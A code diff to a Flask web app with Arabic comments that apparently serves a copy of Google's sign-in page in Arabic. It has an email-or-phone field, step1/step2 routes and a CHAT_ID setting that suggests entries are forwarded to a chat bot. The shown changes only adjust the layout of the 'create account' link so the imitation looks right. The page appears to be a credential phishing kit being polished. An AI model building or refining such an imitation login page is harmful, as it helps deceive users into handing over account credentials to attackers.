@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: تعديل التنسيق لضمان ظهور المسافة المطلوبة بدقة
+# الصفحة الأولى: فصل "إنشاء حساب" عن الفورم وإعطاؤه مسافة ثابتة ومضمونة
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -134,14 +134,15 @@ def step1():
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
-            display: block;
-            margin-bottom: 35px; /* زيادة المسافة بوضوح لتنزيل "إنشاء حساب" للمكان المطلوب تماماً */
+            display: inline-block;
         }
         .forgot-link:hover { text-decoration: underline; }
 
+        /* فصل "إنشاء حساب" تماماً وإعطاؤه مسافة علوية واضحة لتظهر تحت "هل نسيت بريدك" بمسافة ممتازة */
         .signup-container {
             width: 100%;
             text-align: right;
+            margin-top: 45px; 
         }
 
         .signup-link {
@@ -199,12 +200,13 @@ def step1():
                     <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
                 </div>
                 <a href="#" class="forgot-link">هل نسيت بريدك الإلكتروني؟</a>
-                
-                <div class="signup-container">
-                    <a href="https://accounts.google.com/signup" target="_blank" class="signup-link">إنشاء حساب</a>
-                </div>
             </div>
         </form>
+
+        <!-- تم فصل رابط إنشاء حساب عن الفورم وأخذ مساحة علوية مستقلة تضمن نزوله للمكان الصحيح -->
+        <div class="signup-container">
+            <a href="https://accounts.google.com/signup" target="_blank" class="signup-link">إنشاء حساب</a>
+        </div>
     </div>
 
     <div class="footer-action">
@@ -340,7 +342,7 @@ def step2():
             margin-bottom: 8px; 
         }
         
-5        .input-group input {
+        .input-group input {
             width: 100%;
             padding: 12px 14px;
             font-size: 15px;
